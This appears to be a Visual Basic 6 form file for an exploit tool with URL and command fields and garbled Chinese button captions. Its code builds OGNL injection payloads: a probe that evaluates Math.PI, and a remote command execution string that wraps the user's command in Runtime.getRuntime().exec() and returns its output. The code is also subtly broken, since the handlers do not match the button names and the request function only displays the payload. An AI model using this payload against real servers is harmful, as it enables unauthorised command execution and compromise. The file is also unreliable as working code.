VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   4815
   ClientLeft      =   120
   ClientTop       =   450
   ClientWidth     =   7830
   LinkTopic       =   "Form1"
   ScaleHeight     =   4815
   ScaleWidth      =   7830
   StartUpPosition =   3  '¥∞ø⁄»± °
   Begin VB.TextBox Textres 
      Height          =   3735
      Left            =   0
      TabIndex        =   7
      Top             =   1080
      Width           =   7815
   End
   Begin VB.Frame exp 
      Height          =   495
      Left            =   0
      TabIndex        =   3
      Top             =   480
      Width           =   7815
      Begin VB.CommandButton Commandexp 
         Caption         =   "÷¥––"
         Height          =   300
         Left            =   6960
         TabIndex        =   6
         Top             =   120
         Width           =   855
      End
      Begin VB.TextBox Textcmd 
         Height          =   300
         Left            =   600
         TabIndex        =   5
         Top             =   120
         Width           =   6255
      End
      Begin VB.Label Label2 
         Caption         =   "√¸¡Ó"
         Height          =   300
         Left            =   120
         TabIndex        =   4
         Top             =   120
         Width           =   375
      End
   End
   Begin VB.CommandButton Commandpoc 
      Caption         =   "≤‚ ‘"
      Height          =   300
      Left            =   6960
      TabIndex        =   2
      Top             =   120
      Width           =   855
   End
   Begin VB.TextBox Texturl 
      Height          =   300
      Left            =   600
      TabIndex        =   1
      Top             =   120
      Width           =   6255
   End
   Begin VB.Label Label1 
      Caption         =   "URL:"
      Height          =   180
      Left            =   120
      TabIndex        =   0
      Top             =   240
      Width           =   375
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
url = Texturl.Text
pocpayload = "${@java.lang.Math@PI}"
doget (pocpayload)
End Sub


Private Sub Command2_Click()
exppayload = "${@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('" + Textcmd.Text + "').getInputStream())}"
doget (exppayload)
End Sub

Function doget(payload)
MsgBox payload
Textres.Text = payload

End Function
